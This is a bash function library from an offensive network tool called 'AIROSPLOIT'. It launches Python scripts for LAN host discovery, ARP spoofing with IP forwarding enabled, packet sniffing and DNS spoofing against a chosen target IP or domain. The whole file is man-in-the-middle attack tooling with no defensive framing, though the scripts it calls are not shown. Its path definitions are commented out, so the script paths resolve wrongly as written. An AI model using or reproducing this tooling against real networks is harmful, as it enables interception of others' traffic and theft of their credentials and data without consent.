#==================#
# Library Includes #
#==================#
#readonly AIROSPLOITPath=$(dirname $(readlink -f "$0"))

#readonly AIROSPLOITLibPath="$AIROSPLOITPath/lib"
#readonly AIROSPLOITPythonPath="$AIROSPLOITLibPath/python"

readonly AIROSPLOIT_IP="$(hostname -I | awk '{print $1}')"
readonly AIROSPLOIT_Gateway="$(ip -o -4 route show to default | awk '{print $3}')"
readonly AIROSPLOIT_Interface="$(ip -o -4 route show to default | awk '{print $5}')"

readonly AIROSPLOIT_ND="$AIROSPLOITPythonPath/net_discover.py"
readonly AIROSPLOIT_AS="$AIROSPLOITPythonPath/arp_spoof.py"
readonly AIROSPLOIT_PS="$AIROSPLOITPythonPath/packet_sniffer.py"
readonly AIROSPLOIT_DS="$AIROSPLOITPythonPath/dns_spoof.py" 

source "$AIROSPLOITLibPath/InputUtils.sh"
source "$AIROSPLOITLibPath/ValidInputUtils.sh"

#==================#
# Network Discover #
#==================#
airosploit_net_discover() {
echo
xterm -geometry 50x28+0+0 -T "List of IP and MAC" -n "List of IP and MAC" -e "sudo python3.6 $AIROSPLOIT_ND -t $AIROSPLOIT_IP/24; $SHELL" &
clear
airosploit_2
}

#==============#
# ARP spoofing #
#==============#
airosploit_arp_spoof() {
airosploit_input_ip
sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
echo $IP
xterm -geometry 50x15+0-0 -T "ARP spoofing" -n "ARP spoofing" -e "sudo python3.6 $AIROSPLOIT_AS -t $IP -g $AIROSPLOIT_Gateway; $SHELL" &
clear
airosploit_3
}

#=================#
# Packet Sniffing #
#=================#
airosploit_packet_sniffer(){
xterm -geometry 85x20-0+0 -T "Packet Sniffing" -n "Packet Sniffing" -e "sudo python3.6 $AIROSPLOIT_PS -i $AIROSPLOIT_Interface; $SHELL" &
clear
airosploit_3
}

#=================#
# DNS Spoofing #
#=================#
airosploit_dns_spoof(){
airosploit_input_domain
xterm -geometry 50x15+0-250 -T "DNS spoofing" -n "DNS spoofing" -e "sudo python3.6 $AIROSPLOIT_DS -d $DOMAIN -i $AIROSPLOIT_IP; $SHELL" &
clear
airosploit_3
}
